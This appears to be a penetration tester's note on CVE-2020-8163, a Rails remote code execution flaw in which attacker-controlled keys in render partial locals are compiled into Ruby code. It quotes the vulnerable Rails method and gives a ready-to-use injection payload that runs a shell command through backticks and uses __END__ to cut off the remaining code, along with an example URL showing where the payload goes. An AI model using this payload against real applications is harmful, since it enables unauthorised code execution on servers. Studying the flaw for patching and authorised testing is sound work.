# CVE-2020-8163: Rails local name RCE

If the attacker can control the key in a key:value pair, inside a "render partial", you can get RCE  

Identify by injecting into the key  

```ruby
def locals_code #:nodoc:
  # Double assign to suppress the dreaded 'assigned but unused variable' warning
  @locals.each_with_object('') { |key, code| code << "#{key} = #{key} = local_assigns[:#{key}];" }
end

source = <<-end_src
  def #{method_name}(local_assigns, output_buffer)
    _old_virtual_path, @virtual_path = @virtual_path, #{@virtual_path.inspect};_old_output_buffer = @output_buffer;#{locals_code};#{code}
  ensure
    @virtual_path, @output_buffer = _old_virtual_path, _old_output_buffer
  end
end_src
```

Injection happens in the first "#{key}" in the locals_code method  
Need to use a comment to end everything after `__END__`  

Payload will be:

```ruby
`id`%0aend%0a__END__%0a
```

The backticks drop down to a shell to execute the command  
"end" is dropped to a new line to end the method  
"__END__" is dropped onto its own new line so it comments out the remaining code  

```ruby
# As it fits into a url
target.com/test?value=125
target.com/test?`id`%0aend%0a__END__%0a=125
```
